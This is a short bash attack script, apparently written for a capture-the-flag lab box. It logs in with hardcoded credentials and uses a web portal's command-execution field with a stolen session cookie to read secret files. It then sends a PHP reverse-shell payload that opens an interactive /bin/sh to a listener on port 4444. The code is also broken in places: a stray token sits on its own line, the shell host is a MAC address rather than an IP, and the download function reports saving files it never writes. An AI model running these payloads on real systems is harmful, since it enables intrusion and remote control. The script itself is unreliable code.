#!/bin/bash
# Login and save the cookie to a file
# curl -X POST \
#   -d "username=R1ckRul3s&password=Wubbalubbadubdub&sub=Login" \
#   -c cookies.txt \
#   -L \
#   http://10.10.34.106/login.php


COOKIE="PHPSESSID=9ub62l64h189mrl5qqbdfe518g"
BASE_URL="http://10.10.34.106/portal.php"

# Function to download via command execution
download_file() {
 local filename=$1
    local output=${2:-$filename}
    
    curl -s -H "Cookie: PHPSESSID=9ub62l64h189mrl5qqbdfe518g" \
        -d "command=cat $filename&sub=Execute" \
        --compressed \
        http://10.10.34.106/portal.php
    
    echo "Downloaded $filename to $output"
}

# Download all interesting files
download_file "Sup3rS3cretPickl3Ingred.txt"
download_file "clue.txt"
download_file "robots.txt"


nq70ue5eq5foeb9t9954oct9lq
# If PHP is available
curl -s -H "Cookie: PHPSESSID=nq70ue5eq5foeb9t9954oct9lq" \
  -d "command=php -r '\$sock=fsockopen(\"02:42:ac:11:00:02\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'&sub=Execute" \
  --compressed \
  http://10.10.193.141/portal.php